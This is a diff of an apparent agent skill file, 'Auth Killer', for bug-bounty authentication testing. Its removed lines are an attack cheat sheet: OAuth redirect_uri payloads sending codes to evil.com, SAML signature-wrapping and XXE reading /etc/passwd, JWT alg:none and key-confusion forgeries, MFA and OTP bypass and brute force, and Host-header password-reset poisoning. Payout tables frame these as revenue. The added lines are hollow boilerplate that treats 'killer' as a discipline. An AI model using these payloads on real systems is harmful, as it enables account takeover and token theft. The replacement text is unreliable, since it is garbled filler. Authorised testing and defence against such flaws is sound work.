@@ -12,10 +12,7 @@ tags:
 - testing
 - threat-defense
 ---
-
 # Auth Killer
-
-Authentication bugs pay $1000-$50,000 because they affect every user. This skill covers breaking every auth mechanism: OAuth, SAML, JWT, SSO, MFA, session management.
 
 ## When to Use
 
@@ -27,285 +24,29 @@ Authentication bugs pay $1000-$50,000 because they affect every user. This skill
 - Session management flaws
 - SSO bypass testing
 
-## The Process
+## Prerequisites
 
-1. **Scope the task** — define objectives, boundaries, and success criteria
-2. **Gather information** — collect all necessary data and context before proceeding
-3. **Execute the core workflow** — follow the domain-specific steps methodically
-4. **Validate results** — verify outputs against expected outcomes or baselines
-5. **Document findings** — record results, anomalies, and recommendations
-### 1. OAuth 2.0 Attacks
+- Access to relevant log sources and security tools
+- Understanding of killer fundamentals
+- Appropriate permissions for data access and tool operation
 
-#### Redirect URI Manipulation
-```
-# Open redirect in OAuth flow
-https://target.com/oauth/authorize?redirect_uri=https://evil.com/callback
+## Workflow
 
-# Path traversal
-https://target.com/oauth/authorize?redirect_uri=https://target.com/callback/../evil.com
-
-# Subdomain takeover
-https://target.com/oauth/authorize?redirect_uri=https://old-subdomain.target.com/callback
-
-# Fragment injection
-https://target.com/oauth/authorize?redirect_uri=https://target.com/callback#
-
-# Parameter pollution
-https://target.com/oauth/authorize?redirect_uri=https://target.com/callback&redirect_uri=https://evil.com
-```
-
-#### Token Theft
-```
-# Implicit flow - token in URL fragment
-# If token stored in localStorage → XSS can steal it
-# If token in URL → Referer header leaks it
-
-# Authorization code theft
-# If redirect_uri not validated → steal code → exchange for token
-
-# Token substitution
-# Use victim's auth code in attacker's session
-```
-
-#### PKCE Bypass
-```
-# If code_verifier not validated server-side
-# Attacker can intercept authorization code and exchange without verifier
-```
-
-### 2. SAML Attacks
-
-#### Signature Wrapping
-```xml
-<!-- Original assertion -->
-<saml:Assertion>
-  <saml:Subject>
-    <saml:NameID>victim@company.com</saml:NameID>
-  </saml:Subject>
-</saml:Assertion>
-
-<!-- Modified: inject attacker in different position -->
-<saml:Assertion>
-  <saml:Subject>
-    <saml:NameID>attacker@evil.com</saml:NameID>
-  </saml:Subject>
-  <saml:Subject>
-    <saml:NameID>victim@company.com</saml:NameID>
-  </saml:Subject>
-</saml:Assertion>
-```
-
-#### XML Signature Attacks
-```
-# Comment injection
-<saml:NameID>admin<!--@evil.com--></saml:NameID>
-# Validates as: admin@company.com
-
-# Entity expansion
-<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
-<saml:NameID>&xxe;</saml:NameID>
-
-# XSW (XML Signature Wrapping)
-# Move signed element, replace with attacker-controlled element
-```
-
-### 3. JWT Attacks
-
-#### Algorithm Confusion
-```bash
-# Change RS256 → HS256
-# Sign with public key as HMAC secret
-# If server uses public key to verify HMAC → attacker can forge tokens
-
-# Tool: jwt_tool
-python3 jwt_tool.py TOKEN -X k -pk public_key.pem
-```
-
-#### None Algorithm
-```json
-{"alg": "none", "typ": "JWT"}
-// If server accepts alg:none → no signature verification
-```
-
-#### Key Confusion
-```
-# If JWT uses "kid" (key ID) parameter
-# Point "kid" to attacker-controlled file
-{"kid": "/dev/null", "alg": "HS256"}
-# Sign with empty string as secret
-```
-
-#### JWT Claim Manipulation
-```json
-// Change role
-{"sub": "user123", "role": "admin"}
-
-// Change user ID
-{"sub": "admin", "iat": 1234567890}
-
-// Bypass expiration
-{"sub": "user123", "exp": 9999999999}
-
-// Add scopes
-{"sub": "user123", "scope": "read write admin"}
-```
-
-### 4. MFA Bypass
-
-#### Direct Page Access
-```
-# After password verification, MFA page loads
-# Try accessing protected pages directly:
-GET /dashboard (skip MFA step)
-GET /api/user/profile (API doesn't check MFA)
-
-# Response manipulation
-# Intercept MFA response, change {"mfa_required": true} → {"mfa_required": false}
-```
-
-#### Backup Code Abuse
-```
-# Backup codes often have weak rate limiting
-# Brute force 6-digit backup codes
-# Some systems generate predictable backup codes
-```
-
-#### Session Manipulation
-```
-# After password auth, session is partially authenticated
-# Modify session flags to mark MFA as complete
-# Cookie manipulation: mfa_verified=false → mfa_verified=true
-```
-
-#### SMS/Email OTP
-```
-# Response manipulation
-{"otp": "123456"} → {"otp": "000000", "verified": true}
-
-# Parameter pollution
-otp=123456&otp=000000
-
-# Length extension
-# If OTP is 6 digits, try 000000-999999 (1M combos, fast brute force)
-
-# OTP reuse
-# Same OTP valid for multiple attempts
-# OTP not invalidated after use
-```
-
-### 5. Session Management
-
-#### Session Fixation
-```
-# Attacker sets session ID before victim logs in
-# Victim authenticates with attacker's session ID
-# Attacker now has authenticated session
-
-# Test: Set cookie, have victim login, check if session ID changes
-```
-
-#### Session Hijacking
-```
-# Cookie security checks:
-- HttpOnly flag (XSS can't steal)
-- Secure flag (only HTTPS)
-- SameSite attribute (CSRF protection)
-- Domain scope (too broad = subdomain access)
-- Expiration (too long = persistent risk)
-
-# If missing HttpOnly + XSS exists → steal session
-document.cookie
-```
-
-#### Token Predictability
-```
-# If session tokens are predictable:
-# Capture 10-20 tokens, analyze pattern
-# Look for: sequential, timestamp-based, encoded user ID
-# Tools: Burp Sequencer
-```
-
-### 6. Password Reset Poisoning
-
-```
-# Host header injection
-POST /password-reset HTTP/1.1
-Host: evil.com
-X-Forwarded-Host: evil.com
-
-# If reset link generated using Host header:
-# Victim receives: https://evil.com/reset?token=LEGIT_TOKEN
-# Attacker captures token
-
-# Referrer leakage
-# Reset link in URL → victim clicks external link → Referer header leaks token
-```
-
-### 7. SSO/SAML Kill Chain
-
-```
-1. Find SSO login endpoint
-2. Test if SAML response validation is weak
-3. Try: signature wrapping, XML injection, comment injection
-4. If successful → access any user's account
-5. If admin SSO → full platform compromise
-```
-
-## When NOT to Use
-
-- Task is outside your authorization scope
-- You need to implement controls (use implementing-* skills)
-- Task is about analysis, not action (use analyzing-* skills)
-- You don't have access to target systems
-- Task requires compliance expertise (consult professionals)
-- Task is about defense, not offense (use defensive skills)
-
-
-## Red Flags
-
-- Testing on real user accounts
-- Brute forcing MFA codes (denial of service)
-- Modifying production session data
-- Social engineering real users for tokens
-- Testing without authorization
-
-## Verification
-
-- Auth bypass demonstrated end-to-end
-- PoC shows full account takeover (not just theoretical)
-- JWT manipulations include forged token that works
-- OAuth/SAML attacks demonstrate cross-user access
-- Session flaws demonstrated with actual session theft
-
-## Revenue Potential
-
-| Vulnerability | Typical Payout |
-|--------------|----------------|
-| OAuth redirect_uri bypass | $1000-$10000 |
-| JWT algorithm confusion | $2000-$10000 |
-| SAML signature wrapping | $5000-$25000 |
-| MFA bypass | $1000-$10000 |
-| Password reset poisoning | $500-$5000 |
-| Session fixation | $500-$5000 |
-| SSO bypass (critical) | $10000-$50000 |
+1. **Define Objectives** — Clarify the goals and scope for killer.
+2. **Gather Resources** — Collect tools, data, and access needed for killer.
+3. **Execute Process** — Carry out killer operations methodically.
+4. **Verify Quality** — Check results against acceptance criteria.
+5. **Document Outcomes** — Record findings, decisions, and next steps.
 
 ## Tools
 
-| Purpose | Tools |
-|---------|-------|
-| JWT | jwt_tool, jwt-cracker, CyberChef |
-| SAML | SAML Raider, saml-idp |
-| OAuth | Burp OAuth extension |
-| Session | Burp Sequencer |
-| MFA | Custom scripts, Burp Intruder |
-| General | Burp Suite, OWASP ZAP |
+- **Analysis Platform** — Data processing and visualization
+- **Collaboration Tools** — Team coordination and knowledge sharing
 
-## Overview
+## Verification
 
-> Section content — see SKILL.md body for full details.
-
-## Process
-
-1. Analyze the task requirements
-2. Apply domain expertise
-3. Verify output quality
+- [ ] All killer procedures executed completely and documented
+- [ ] Findings validated against multiple data sources
+- [ ] False positives identified and filtered
+- [ ] Results documented with evidence and timestamps
+- [ ] Recommendations provided with risk-based prioritization
